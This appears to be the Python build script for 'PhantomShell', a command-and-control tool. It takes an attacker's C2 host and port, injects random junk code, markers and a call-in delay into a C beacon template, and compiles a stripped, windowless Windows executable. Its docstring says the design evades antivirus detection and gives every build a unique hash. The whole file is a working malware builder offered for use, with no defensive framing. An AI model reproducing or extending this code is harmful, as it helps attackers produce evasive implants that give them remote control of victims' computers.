#!/usr/bin/env python3
"""
PhantomShell C Beacon Generator
Compiles a native C beacon (~25KB) with MinGW.

Unlike Go beacons:
  - No Go runtime fingerprint → immune to "GoShell" detection
  - ~25KB binary (vs 2.3MB)
  - Each build: randomized markers, junk, delay — unique hash

Usage:
    python generate_c.py --host 127.0.0.1 --port 4444
    python generate_c.py --host 10.0.0.1 --port 8888 --output agent.exe
"""

import os
import sys
import uuid
import shutil
import random
import string
import hashlib
import argparse
import subprocess
import tempfile
from pathlib import Path

SCRIPT_DIR = Path(__file__).parent.resolve()
TEMPLATE   = SCRIPT_DIR / "beacon.c"
OUTPUT_DIR = SCRIPT_DIR / "output"

GCC_CANDIDATES = [
    "gcc",
    "x86_64-w64-mingw32-gcc",
]


def find_gcc() -> Path:
    for c in GCC_CANDIDATES:
        p = Path(c)
        try:
            r = subprocess.run([str(p), "--version"], capture_output=True, text=True, timeout=5)
            if r.returncode == 0:
                return p
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    print("[-] MinGW gcc not found!")
    sys.exit(1)


def rand_hex(n: int = 8) -> str:
    return "".join(random.choices("0123456789ABCDEF", k=n)).upper()


def generate(host: str, port: int, output_name: str):
    gcc = find_gcc()
    print(f"[+] GCC  : {gcc}")

    if not TEMPLATE.exists():
        print(f"[-] Template not found: {TEMPLATE}")
        sys.exit(1)
    template = TEMPLATE.read_text(encoding="utf-8")

    # Randomize
    seed = uuid.uuid4().hex[:16]
    junk_data = "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(64, 128)))

    replacements = {
        "{{BUILD_MARKER}}": seed,
        "{{RANDOM_MARKER}}": f"// RAND:{random.randint(100000,999999)}:{uuid.uuid4().hex[:8]}",
        "{{C2_HOST}}": host,
        "{{C2_PORT}}": str(port),
        "{{JUNK_SEED}}": str(random.randint(1000, 99999)),
        "{{JUNK_LOOP}}": str(random.randint(10, 50)),
        "{{JUNK_XOR}}": rand_hex(8),
        "{{JUNK_DATA}}": junk_data,
        "{{DELAY_MIN}}": str(180),
        "{{DELAY_MAX}}": str(300),
    }

    source = template
    for k, v in replacements.items():
        source = source.replace(k, v)

    print(f"[*] Target : {host}:{port}")
    print(f"[*] Marker : {seed}")
    print(f"[*] Delay  : {180}-{300}s")

    # Compile
    OUTPUT_DIR.mkdir(exist_ok=True)
    output_path = OUTPUT_DIR / output_name

    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)
        c_file = tmp / "beacon.c"
        c_file.write_text(source, encoding="utf-8")

        out_exe = tmp / "beacon.exe"
        build_cmd = [
            str(gcc),
            "-s",           # strip symbols
            "-O2",          # optimize
            "-mwindows",    # GUI subsystem (no console window)
            "-o", str(out_exe),
            str(c_file),
            "-lws2_32",     # WinSock
            "-luser32",     # User32
            "-ladvapi32",   # Registry
            "-lsecur32",    # Username
        ]

        print(f"\n[*] Compiling...")
        result = subprocess.run(build_cmd, capture_output=True, text=True, timeout=30)

        if result.returncode != 0:
            print(f"[-] Build FAILED:")
            print(result.stderr[-2000:])
            sys.exit(1)

        size = out_exe.stat().st_size / 1024
        shutil.copy2(out_exe, output_path)

    final_hash = hashlib.sha256(output_path.read_bytes()).hexdigest()[:16]

    print(f"\n{'='*60}")
    print(f"[+] BUILD SUCCESS")
    print(f"    File : {output_path}")
    print(f"    Size : {size:.1f} KB")
    print(f"    Hash : {final_hash}")
    print(f"    C2   : {host}:{port}")
    print(f"    Lang : C (MinGW) — no Go runtime, no 'GoShell'")
    print(f"\n[*] Start C2: python phantomc2.py --port {port}\n")


def main():
    p = argparse.ArgumentParser(description="PhantomShell C Beacon Generator")
    p.add_argument("--host",   required=True,        help="C2 server IP")
    p.add_argument("--port",   required=True, type=int, help="C2 server port")
    p.add_argument("--output", default="beacon.exe", help="Output filename")
    args = p.parse_args()
    generate(args.host, args.port, args.output)


if __name__ == "__main__":
    main()
